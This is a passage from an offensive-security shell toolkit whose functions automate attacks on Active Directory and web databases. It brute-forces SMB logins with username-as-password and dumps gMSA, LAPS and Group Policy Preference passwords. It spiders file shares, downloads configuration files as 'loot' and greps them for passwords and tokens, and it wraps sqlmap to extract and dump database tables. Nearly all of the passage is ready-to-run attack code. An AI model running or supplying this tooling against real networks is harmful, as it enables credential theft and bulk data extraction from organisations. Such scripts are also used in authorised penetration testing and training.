    echo -e "\033[1;35m[!] Searching for pre-Win2k compatible computer accounts (NoPac) \033[0m"
    echo -e "\033[0;34m[>] pre2k unauth -d $domain -dc-ip $dc_ip -inputfile <users_list> \033[0m"
    pre2k unauth -d "$domain" -dc-ip "$dc_ip" -inputfile "$users_tmp" 2>/dev/null | grep -ioE "VALID CREDENTIALS: .*" --color=never
  fi

  echo -e "\033[1;36m[?] Bruteforce all discovered users with username as password? [y/N]\033[0m"
  read -s -q confirm
  echo ""
  if [[ "$confirm" =~ ^[Yy]$ ]]; then
    if [[ -s "$users_tmp" ]]; then
      echo -e "\033[1;35m[!] Starting username-as-password bruteforce... \033[0m"
      while read -r target_user; do
        nxc smb "$target" -u "$target_user" -p "$target_user" 2>/dev/null | grep '\[+]' | tr -s " " | cut -d " " -f 6
      done <"$users_tmp"
    else
      echo -e "\033[1;31m[!] User list is empty. Run RID bruteforce first. Skipping. \033[0m"
    fi
  fi

  echo -e "\n\033[1;37m[\033[1;35m+\033[1;37m] Looking for interesting domain configuration and services... \033[0m"

  echo -e "\033[1;35m[!] Searching for PKI Enrollment Services (ADCS) \033[0m"
  echo -e "\033[0;34m[>] nxc ldap ${nxc_auth[@]} -M adcs \033[0m"
  nxc ldap "${nxc_auth[@]}" -M adcs 2>/dev/null | grep 'ADCS' | tr -s " " | cut -d ' ' -f 6-

  echo -e "\033[1;35m[!] Enumerating trust relationships \033[0m"
  echo -e "\033[0;34m[>] nxc ldap ${nxc_auth[@]} -M enum_trusts \033[0m"
  nxc ldap "${nxc_auth[@]}" -M enum_trusts 2>/dev/null | grep 'ENUM_TRUSTS' | tr -s " " | cut -d ' ' -f 6-

  echo -e "\033[1;35m[!] Enumerating MachineAccountQuota (MAQ) \033[0m"
  echo -e "\033[0;34m[>] nxc ldap ${nxc_auth[@]} -M maq \033[0m"
  nxc ldap "${nxc_auth[@]}" -M maq 2>/dev/null | grep -oE "MachineAccountQuota: .*" --color=never

  echo -e "\033[1;35m[!] Enumerating delegation rights \033[0m"
  echo -e "\033[0;34m[>] findDelegation.py "${imp_auth[@]}" \033[0m"
  findDelegation.py "${imp_auth[@]}" 2>/dev/null | grep --color=never "\S" | tail -n +2

  echo -e "\033[1;35m[!] Enumerating DCSync rights \033[0m"
  local domain1 domain2
  domain1=$(echo "$domain" | cut -d '.' -f 1)
  domain2=$(echo "$domain" | cut -d '.' -f 2-)
  echo -e "\033[0;34m[>] nxc ldap ${nxc_auth[@]} -M daclread -o TARGET_DN=\"DC=$domain1,DC=$domain2\" ACTION=read RIGHTS=DCSync \033[0m"
  nxc ldap "${nxc_auth[@]}" -M daclread -o TARGET_DN="DC=$domain1,DC=$domain2" ACTION=read RIGHTS=DCSync 2>/dev/null | grep "Trustee" | cut -d ":" -f 2 | sed 's/^[[:space:]]*//'

  echo -e "\033[1;35m[!] Searching for credentials in Group Policy Preferences (GPP) \033[0m"
  echo -e "\033[0;34m[>] nxc smb ${nxc_auth[@]} -M gpp_password -M gpp_autologin \033[0m"
  nxc smb "${nxc_auth[@]}" -M gpp_password 2>/dev/null | grep -aioE "Found credentials .*|userName: .*|Password: .*" --color=never
  nxc smb "${nxc_auth[@]}" -M gpp_autologin 2>/dev/null | grep -aioE "Found credentials .*|Usernames: .*|Passwords: .*" --color=never

  echo -e "\n\033[1;37m[\033[1;35m+\033[1;37m] Starting data collection... \033[0m"

  echo -e "\033[1;36m[?] Ingest data for Bloodhound? [y/N] \033[0m"
  read -s -q confirm
  echo ""
  if [[ "$confirm" =~ ^[Yy]$ ]]; then
    echo -e "\033[1;35m[!] Ingesting AD data for BloodHound \033[0m"
    echo -e "\033[0;34m[>] nxc ldap ${nxc_auth[*]} --bloodhound --collection All --dns-server $dc_ip \033[0m"

    local zip_path
    zip_path=$(nxc ldap "${nxc_auth[@]}" --bloodhound --collection All --dns-server "$dc_ip" 2>/dev/null |
      grep -oE '/[^ ]+_bloodhound\.zip' | tail -1)

    if [[ -n "$zip_path" && -f "$zip_path" ]]; then
      local dest_zip="./${domain}_bloodhound.zip"
      mv "$zip_path" "$dest_zip"
      echo -e "\033[0;34m[*] Saving data to $dest_zip\033[0m"
    else
      echo -e "\033[1;31m[!] Could not find BloodHound zip output!\033[0m"
    fi
  fi

  trap - INT
  echo -e "\n\033[1;31m[*] Done. \033[0m"
}

# ENUMUSER
# Enumerates specific rights and potential data sources for a given user.
#------------------------------------------------------------------------------------
enumuser() {
  local usage="
Usage: enumuser -t <target> -u <user> [-p <password> | -H <hash>] [-k]
  Enumerates a specific user's groups, rights, and potential access.

  -t, --target    Target Domain Controller IP or hostname. (Required)
  -u, --user      Username to enumerate. (Required)
  -p, --password  Password for authentication.
  -H, --hash      NTLM hash for pass-the-hash authentication.
  -k, --kerb      Use Kerberos authentication (requires a valid TGT).
"
  echo '
                           \033[1;33m  |  |   __|  __|  _ \ \033[0m
     -_)    \   |  |   ` \ \033[1;33m  |  | \__ \  _|     / \033[0m
   \___| _| _| \_,_| _|_|_|\033[1;33m \__/  ____/ ___| _|_\ \033[0m
'
  get_auth "$@"
  if [[ $? -ne 0 ]]; then
    echo "$usage"
    return 1
  fi

  trap "echo ''" INT

  echo -e "\033[1;35m[!] Enumerating '$user' groups \033[0m"
  echo -e "\033[0;34m[>] nxc ldap ${nxc_auth[@]} -M groupmembership -o USER=\"$user\" \033[0m"
  nxc ldap "${nxc_auth[@]}" -M groupmembership -o USER="$user" 2>/dev/null | tail -n +4 | tr -s " " | cut -d " " -f 5-

  echo -e "\033[1;35m[!] Trying to dump gMSA passwords with user's rights \033[0m"
  echo -e "\033[0;34m[>] nxc ldap ${nxc_auth[@]} --gmsa \033[0m"
  nxc ldap "${nxc_auth[@]}" --gmsa 2>/dev/null | grep -aoE "Account:.*" --color=never

  echo -e "\033[1;35m[!] Trying to dump LAPS passwords with user's rights \033[0m"
  echo -e "\033[0;34m[>] nxc ldap ${nxc_auth[@]} -M laps \033[0m"
  nxc ldap "${nxc_auth[@]}" -M laps 2>/dev/null | tail -n +4 | tr -s " " | cut -d " " -f 6-
  echo -e "\033[0;34m[>] nxc smb ${nxc_auth[@]} --laps --dpapi \033[0m"
  nxc smb "${nxc_auth[@]}" --laps --dpapi 2>/dev/null | tail -n +4 | tr -s " " | cut -d " " -f 6-

  echo -e "\033[1;35m[!] Trying to find KeePass files readable by user \033[0m"
  echo -e "\033[0;34m[>] nxc smb ${nxc_auth[@]} -M keepass_discover \033[0m"
  nxc smb "${nxc_auth[@]}" -M keepass_discover 2>/dev/null | grep -aoE "Found .*" --color=never

  trap - INT
  echo -e "\033[1;31m[*] Done. \033[0m"
}

# ENUMSHARES
# Enumerates readable network shares and optionally spiders them for interesting files.
#------------------------------------------------------------------------------------
enumshares() {
  local usage="
Usage: enumshares -u <user> [-p <pass> | -H <hash>] [-t <target>] [-k]
  Enumerates and spiders SMB shares.

  -u, --user      Username for authentication. (Required)
  -p, --password  Password for authentication.
  -H, --hash      NTLM hash for pass-the-hash authentication.
  -t, --target    A single target host. If omitted, uses hosts from ./hosts.txt.
  -k, --kerb      Use Kerberos authentication.
"
  echo '
                         \033[1;33m   __|  |  |    \    _ \  __|   __| \033[0m
   -_)    \   |  |   ` \ \033[1;33m \__ \  __ |   _ \     /  _|  \__ \ \033[0m
 \___| _| _| \_,_| _|_|_|\033[1;33m ____/ _| _| _/  _\ _|_\ ___| ____/ \033[0m
'
  local target_host=""
  local auth_args=()
  while [[ $# -gt 0 ]]; do
    case "$1" in
      -t | --target) target_host="$2"; shift 2 ;;
      -h | --help) echo "$usage"; return 0 ;;
      *) auth_args+=("$1"); shift ;;
    esac
  done

  local hosts_tmp shares_tmp share_names_tmp files_tmp
  hosts_tmp=$(mktemp)
  shares_tmp=$(mktemp)
  share_names_tmp=$(mktemp)
  files_tmp=$(mktemp)
  trap 'rm -f "$hosts_tmp" "$shares_tmp" "$share_names_tmp" "$files_tmp";' EXIT TERM
  trap "echo ''" INT

  if [[ -n "$target_host" ]]; then
    echo "$target_host" >"$hosts_tmp"
  elif [[ -f "hosts.txt" ]]; then
    cp hosts.txt "$hosts_tmp"
  else
    echo -e "\033[1;31m[!] No target specified (-t) and hosts.txt not found. \033[0m"
    echo "$usage"
    trap - INT
    return 1
  fi

  while read -r target; do
    echo -e "\033[1;35m[!] Enumerating shares on $target \033[0m"
    echo -e "\033[0;34m[>] nxc smb \"$target\" ${auth_args[@]} --shares \033[0m"
    nxc smb "$target" "${auth_args[@]}" --shares |
      grep -E "READ|WRITE" | tr -s " " | cut -d " " -f 5- | tee "$shares_tmp" # Use tee
    cat "$shares_tmp"

    cat "$shares_tmp" | awk -F 'READ' '{print $1}' | awk '{$1=$1};1' | tee "$share_names_tmp" # Use tee

    while read -r share; do
      echo -e "\033[1;36m[?] Spider '$share' share for interesting files? [y/N]\033[0m"
      read -s -q confirm
      echo ""
      if [[ "$confirm" =~ ^[Yy]$ ]]; then
        echo -e "\033[1;35m[*] Searching '$share' for config/script/text files \033[0m"
        local regex_pattern="\.txt|\.xml|\.config|\.cnf|\.conf|\.ini|\.ps1"
        echo -e "\033[0;34m[>] nxc smb \"$target\" ${auth_args[@]} --spider \"$share\" --regex '$regex_pattern' \033[0m"
        nxc smb "$target" "${auth_args[@]}" --spider "$share" --regex "$regex_pattern" |
          grep -v '\[.\]' | tr -s " " | cut -d " " -f 5- | cut -d '[' -f 1 |
          sed 's/[[:space:]]*$//' | tee "$files_tmp" # Use tee
        cat "$files_tmp"

        if [[ -s "$files_tmp" ]]; then
          echo -e "\033[1;36m[?] Download these files? [y/N]\033[0m"
          read -s -q confirm_dl
          echo ""
          if [[ "$confirm_dl" =~ ^[Yy]$ ]]; then
            local dir_path="./${target}_${share}_loot"
            mkdir -p "$dir_path"
            echo -e "\033[1;35m[*] Saving files to $dir_path \033[0m"

            local smb_user smb_pass
            for i in "${!auth_args[@]}"; do
              if [[ "${auth_args[i]}" == "-u" ]]; then smb_user="${auth_args[i+1]}"; fi
              if [[ "${auth_args[i]}" == "-p" ]]; then smb_pass="${auth_args[i+1]}"; fi
            done

            while read -r file_path_full; do
              local share_path file_path file_name
              share_path="//$target/$share"
              file_path=$(echo "$file_path_full" | sed "s|/|\\\\|g")
              file_name=$(basename "$file_path_full")
              echo -e "\033[0;34m[>] smbclient \"$share_path\" -U \"$domain\\$smb_user%$smb_pass\" -c \"get \\\"$file_path\\\" \\\"$dir_path/$file_name\\\"\" \033[0m"
              smbclient "$share_path" -U "$domain\\$smb_user%$smb_pass" -c "get \"$file_path\" \"$dir_path/$file_name\"" >/dev/null 2>&1
            done <"$files_tmp"

          echo -e "\033[1;35m[*] Procurando por segredos nos arquivos baixados... \033[0m"
          local secret_pattern="password|passwd|secret|key|token|cred|connstr"
          echo -e "\033[0;34m[>] grep -iE -r \"$secret_pattern\" \"$dir_path\" \033[0m"
          grep -iE -r --color=always "$secret_pattern" "$dir_path"

          fi
        fi
      fi
    done <"$share_names_tmp"
  done <"$hosts_tmp"

  trap - INT
  echo -e "\033[1;31m[*] Done. \033[0m"
}

# ENUMSQL
# Automates enumeration and data dumping using sqlmap.
#------------------------------------------------------------------------------------
enumsql() {
  local usage="
Usage: enumsql <sqlmap_target_options>
  A wrapper for sqlmap to automate enumeration and dumping.
  Pass any valid sqlmap options for targeting (e.g., -u 'http://...').

Example: enumsql -u 'http://test.com/vuln.php?id=1' --cookie='...' --batch
"
  echo '
                         \033[1;33m    __|   _ \   |    \033[0m
   -_)    \   |  |   ` \ \033[1;33m  \__ \  (   |  |    \033[0m
 \___| _| _| \_,_| _|_|_|\033[1;33m  ____/ \__\_\ ____| \033[0m
 '
  if [[ $# -eq 0 ]]; then
    echo -e "\033[1;31m[!] Missing sqlmap parameters. \033[0m"
    echo "$usage"
    return 1
  fi

  local tmp_dir
  tmp_dir=$(mktemp -d)
  trap 'rm -rf "$tmp_dir";' EXIT TERM
  trap "echo ''" INT

  echo -e "\033[1;37m[\033[1;35m+\033[1;37m] Starting DBMS enumeration... \033[0m"

  echo -e "\033[1;35m[!] Fetching database banner \033[0m"
  echo -e "\033[0;34m[>] sqlmap $@ --banner --batch \033[0m"
  sqlmap "$@" --banner --batch 2>/dev/null | grep -E --color=never "technology:|DBMS:|banner:|system:" | grep -v '^$'

  echo -e "\033[1;35m[!] Fetching current user and DBA status \033[0m"
  echo -e "\033[0;34m[>] sqlmap $@ --current-user --is-dba --batch \033[0m"
  sqlmap "$@" --current-user --is-dba --batch 2>/dev/null | grep -oP --color=never "(?<=current user: ').*(?=')|(?<=DBA: ).*" | grep -v '^$' | highlight red "True"

  echo -e "\033[1;35m[!] Fetching user privileges \033[0m"
  echo -e "\033[0;34m[>] sqlmap $@ --privileges --batch \033[0m"
  sqlmap "$@" --privileges --batch 2>/dev/null | grep -oP --color=never "(?<=privilege: ').*(?=')" | grep -v '^$'

  echo -e "\n\033[1;37m[\033[1;35m+\033[1;37m] Starting data enumeration... \033[0m"
  echo -e "\033[1;35m[!] Fetching all databases \033[0m"
  echo -e "\033[0;34m[>] sqlmap $@ --dbs --batch \033[0m"
  sqlmap "$@" --dbs --batch 2>/dev/null |
    grep -vE "^\s*$|starting|ending|\[INFO\]|\[WARNING\]|\[CRITICAL\]" |
    sed 's/^\[\*\] //' | grep -E '^[a-zA-Z0-9_]+$' | tee "$tmp_dir/dbs.txt"

  local db
  db=$(sqlmap "$@" --current-db --batch 2>/dev/null | grep -oP --color=never "(?<=current database: ').*(?=')")
  if [[ -z "$db" ]]; then
    echo -e "\033[1;33m[*] Could not determine current DB automatically. Please select one.\033[0m"
    trap - INT
    return 1
  fi
  echo -e "\033[1;35m[!] Current database is '$db'. Fetching tables... \033[0m"
  echo -e "\033[0;34m[>] sqlmap $@ -D \"$db\" --tables --batch \033[0m"
  sqlmap "$@" -D "$db" --tables --batch 2>/dev/null |
    grep -oP --color=never "(?<=\| ).*(?= \|)" | tail -n +2 |
    sed 's/[[:space:]]*$//' | tee "$tmp_dir/tables.txt"

  if [[ ! -s "$tmp_dir/tables.txt" ]]; then
    echo -e "\033[1;31m[*] No tables found in database '$db'. \033[0m"
    trap - INT
    return 1
  fi

  echo -e "\033[1;36m[?] Enter tables to dump (comma-separated, or 'all'): \033[0m"
  stty sane
  read -r selected_tables
  if [[ -z "$selected_tables" || "$selected_tables" == "all" ]]; then
    cp "$tmp_dir/tables.txt" "$tmp_dir/selected_tables.txt"
  else
    echo "$selected_tables" | tr ',' '\n' | sed 's/^[[:space:]]*//;s/[[:space:]]*$//' >"$tmp_dir/selected_tables.txt"
  fi

  while IFS= read -r table; do
    echo -e "\n\033[1;37m[\033[1;35m+\033[1;37m] Accessing table \"$table\"... \033[0m"
    echo -e "\033[1;36m[?] Dump entire table or select columns? [D]ump all / [S]elect columns: \033[0m"
    read -s -q confirm_dump
    echo ""
    if [[ "$confirm_dump" =~ ^[Ss]$ ]]; then
      echo -e "\033[1;35m[!] Retrieving columns for table '$table' \033[0m"
      echo -e "\033[0;34m[>] sqlmap $@ -D \"$db\" -T \"$table\" --columns --batch \033[0m"
      sqlmap "$@" -D "$db" -T "$table" --columns --batch 2>/dev/null |
        grep -oP '(?<=\| )[a-zA-Z0-9_]+' | tee "$tmp_dir/columns.txt"
      echo -e "\033[1;36m[?] Enter columns to dump (comma-separated): \033[0m"
      read -r selected_columns
      echo -e "\033[1;35m[!] Dumping selected columns... \033[0m"
      echo -e "\033[0;34m[>] sqlmap $@ -D \"$db\" -T \"$table\" -C \"$selected_columns\" --dump --batch \033[0m"
      sqlmap "$@" -D "$db" -T "$table" -C "$selected_columns" --dump --batch |
        grep --color=never -P "Database: .*|Table: .*|^\+\-*|\|\s.*" | grep -vE '^\+\-+'
    else
      echo -e "\033[1;35m[!] Dumping entire table '$table' \033[0m"
      echo -e "\033[0;34m[>] sqlmap $@ -D \"$db\" -T \"$table\" --dump --batch \033[0m"
      sqlmap "$@" -D "$db" -T "$table" --dump --batch |
        grep --color=never -P "Database: .*|Table: .*|^\+\-*|\|\s.*" | grep -vE '^\+\-+'
    fi
  done <"$tmp_dir/selected_tables.txt"

  trap - INT
  echo -e "\033[1;31m[*] Done. \033[0m"
}

# # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #
#
#    H E L P E R   F U N C T I O N S
#
#    Don't call these functions directly!
#
# # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #

# EZPZ (Help Function)
# Provides help and usage information for all available commands.
#------------------------------------------------------------------------------------
ezpz() {
  local command_name="$1"
  if [[ -n "$command_name" ]]; then
    if declare -f "$command_name" >/dev/null; then
      "$command_name" --help
    else
      echo -e "\033[1;31m[!] Unknown command: '$command_name'\033[0m"
      echo "Run 'ezpz' with no arguments to see a list of available commands."
    fi
  else
    echo -e '
       __  /\033[1;33m      __  / \033[0m
   -_)    / \033[1;33m  _ \    /  \033[0m
 \___| ____|\033[1;33m .__/ ____| \033[0m
            \033[1;33m_|          \033[0m
'

    #echo -e "\033[1;35m[!] eZpZ Hacking Scripts \033[0m"
    #echo "---------------------------------"
    echo "Usage: <command> [options]"
    echo "Run 'ezpz <command>' for detailed help on a specific command."
    echo ""
    echo -e "\033[1;36mAvailable Commands:\033[0m"
    echo -e "  \033[1;32mnetscan\033[0m       - Network and port scanning."
    echo -e "  \033[1;32mwebscan\033[0m       - Web server enumeration and fuzzing."
    echo -e "  \033[1;32madscan\033[0m        - Active Directory discovery and host mapping."
    echo -e "  \033[1;32menumdomain\033[0m    - Full Active Directory domain enumeration."
    echo -e "  \033[1;32menumuser\033[0m      - Enumerate a specific domain user's rights."
    echo -e "  \033[1;32menumshares\033[0m    - Enumerate and spider SMB shares."
    echo -e "  \033[1;32mcheckvulns\033[0m    - Check for common low-hanging fruit vulnerabilities."
    echo -e "  \033[1;32mtestcreds\033[0m     - Test credentials against multiple protocols."
    echo -e "  \033[1;32menumsql\033[0m       - Automated SQL injection enumeration with sqlmap."
    echo -e "  \033[1;32mstartresponder\033[0m - Launch Responder for hash capturing."
    echo ""
  fi
}

# HIGHLIGHT & COLOR
# Functions for colorizing output streams.
#------------------------------------------------------------------------------------
highlight() {
  declare -A fg_color_map
  fg_color_map=(black 30 red 31 green 32 yellow 33 blue 34 magenta 35 cyan 36)
  local fg_c
  fg_c=$(echo -e "\e[1;${fg_color_map[$1]}m")
  local c_rs=$'\e[0m'
  sed -uE "s/($2)/$fg_c\1$c_rs/g"
}
color() {
  declare -A fg_color_map
  fg_color_map=(black 30 red 31 green 32 yellow 33 blue 34 magenta 35 cyan 36)
  local fg_c
  fg_c=$(echo -e "\e[0;${fg_color_map[$1]}m")
  local c_rs=$'\e[0m'
  sed -uE "s/($2)/$fg_c\1$c_rs/g"
}

# GET_AUTH
# Parses authentication arguments and sets global arrays for nxc and impacket tools.
#------------------------------------------------------------------------------------
get_auth() {
  unset nxc_auth imp_auth target user password hashes auth domain dc_ip dc_fqdn
  local kerb=0

  while [[ $# -gt 0 ]]; do
    case "$1" in
      --target | -t) target="$2"; shift 2 ;;
      --user | -u) user="$2"; shift 2 ;;
      --password | -p) password="$2"; auth="password"; shift 2 ;;
      --hash | -H) hashes="$2"; auth="hashes"; shift 2 ;;
      --kcache) auth="kerb"; shift ;;
      --kerb | -k) kerb=1; shift ;;
      --domain | -d) domain="$2"; shift 2 ;;
      --dc-ip) dc_ip="$2"; shift 2 ;;
      --dc-fqdn) dc_fqdn="$2"; shift 2 ;;
      --help | -h) return 1 ;;
      *) shift ;;
    esac
  done

  [[ "$user" == "''" ]] && user=""
  [[ "$password" == "''" ]] && password=""

  if [[ -z "$target" ]]; then
    echo -e "\033[1;31m[!] Target is required. Use --target or -t. \033[0m"
    return 1
  fi

  if [[ -z "$domain" ]]; then
    domain=$(awk 'tolower($0) ~ /dc/ {print $5; exit}' /etc/hosts)
    [[ -z "$domain" ]] && echo -e "\033[1;33m[!] Domain not found. Use --domain. \033[0m"
  fi

  if [[ -z "$dc_ip" ]]; then
    dc_ip=$(awk -v dom="$domain" 'tolower($0) ~ tolower(dom) && tolower($0) ~ /dc/ {print $1; exit}' /etc/hosts)
    if [[ -z "$dc_ip" ]]; then
      dc_ip="$target"
      echo -e "\033[1;33m[!] DC IP not found. Using target '$target' as DC IP. Use --dc-ip. \033[0m"
    fi
  fi

  if [[ -z "$dc_fqdn" ]]; then
    dc_fqdn=$(awk -v dom="$domain" 'tolower($0) ~ tolower(dom) && tolower($0) ~ /dc/ {print $4; exit}' /etc/hosts)
    [[ -z "$dc_fqdn" ]] && echo -e "\033[1;33m[!] DC FQDN not found. Kerberos may fail. Use --dc-fqdn. \033[0m"
  fi

  if [[ $kerb -eq 1 || "$auth" == "kerb" ]]; then
    if command -v ntpdate >/dev/null 2>&1; then
      sudo ntpdate -u "$dc_ip" >/dev/null 2>&1
    else
      echo -e "\033[1;33m[!] ntpdate not found. Skipping time sync. Kerberos may fail.\033[0m"
    fi
  fi

  case "$auth" in
    password)
      nxc_auth=("$target" -u "$user" -p "$password")
      imp_auth="$domain/$user:$password -dc-ip $dc_ip"
      ;;
    hashes)
      nxc_auth=("$target" -u "$user" -H "$hashes")
      imp_auth="$domain/$user -hashes :$hashes -dc-ip $dc_ip"
      ;;
    kerb)
      nxc_auth=("$target" -u "$user" --use-kcache)
      imp_auth="$domain/$user -k -no-pass -dc-ip $dc_ip"
      ;;
    *)
      nxc_auth=("$target" -u '' -p '')
      imp_auth="$domain/'' -dc-ip $dc_ip"
      ;;
  esac

  if [[ $kerb -eq 1 ]]; then
    nxc_auth+=(-k)
    imp_auth+=" -k -no-pass"
    [[ -n "$dc_fqdn" ]] && imp_auth+=" -dc-host $dc_fqdn"
  fi

  export nxc_auth imp_auth target user domain dc_ip dc_fqdn
  return 0
}
